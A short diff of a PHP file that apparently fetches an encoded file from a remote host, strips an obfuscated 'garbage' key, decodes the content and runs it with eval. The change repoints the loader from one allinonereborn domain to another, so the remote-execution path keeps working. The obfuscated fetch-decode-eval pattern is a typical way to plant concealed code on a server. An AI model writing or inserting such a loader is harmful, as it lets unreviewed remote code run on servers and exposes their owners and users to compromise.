@@ -3,7 +3,7 @@ $garbage_key = "+_=aEp1V2Q0TysyT0xrQmdJVkdQVStEMXBzYmtPTVhwbz0==_+";
 // -------------------------------------------------------
 
 // Remote encoded file URL
-$remote_url = "https://allinonereborn.online/remote/encoded_secure.txt";
+$remote_url = "https://allinonereborn.store/remote/encoded_secure.txt";
 
 function extractRealKey($garbage) {
     $clean = preg_replace('/^[@#$!%^&*()+_=-]+/', '', $garbage);
@@ -56,4 +56,5 @@ for ($i = 0; $i < strlen($step3); $i++) {
 }
 
 eval('?>' . $decoded);
+
 ?>
